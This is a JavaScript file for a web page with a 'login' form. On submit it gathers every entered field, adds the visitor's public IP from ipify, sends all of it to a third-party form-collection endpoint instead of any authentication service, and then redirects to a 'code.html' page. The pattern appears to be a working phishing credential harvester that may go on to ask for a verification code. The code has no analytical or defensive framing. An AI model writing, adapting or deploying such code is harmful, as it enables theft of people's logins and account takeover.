// script.js

document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');
    const formsparkEndpoint = 'https://submit-form.com/nmGVmZB4C'; // Your Formspark endpoint

    if (form) {
        form.addEventListener('submit', async (event) => {
            event.preventDefault(); // Prevent default form submission

            const submitButton = form.querySelector('button[type="submit"]');
            if (submitButton) {
                submitButton.disabled = true;
            }

            // Collect form data first
            const formData = new FormData(form);
            const data = {};
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }

            try {
                // Fetch user IP from ipify API
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (ipResponse.ok) {
                    const ipData = await ipResponse.json();
                    data.ip = ipData.ip; // Add IP to data
                } else {
                    console.warn('Could not fetch IP address.');
                }
            } catch (ipError) {
                console.warn('Error fetching IP address:', ipError);
            }

            try {
                const response = await fetch(formsparkEndpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(data),
                });

                if (response.ok) {
                    form.reset();
                    console.log('Form data sent to Formspark successfully!');
                    window.location.href = 'code.html';
                } else {
                    const errorText = await response.text();
                    console.error('Formspark submission failed:', response.status, errorText);
                    if (submitButton) {
                        submitButton.disabled = false;
                    }
                }
            } catch (error) {
                console.error('Error submitting form:', error);
                if (submitButton) {
                    submitButton.disabled = false;
                }
            }
        });
    } else {
        console.error('Form with ID "loginForm" not found.');
    }
});
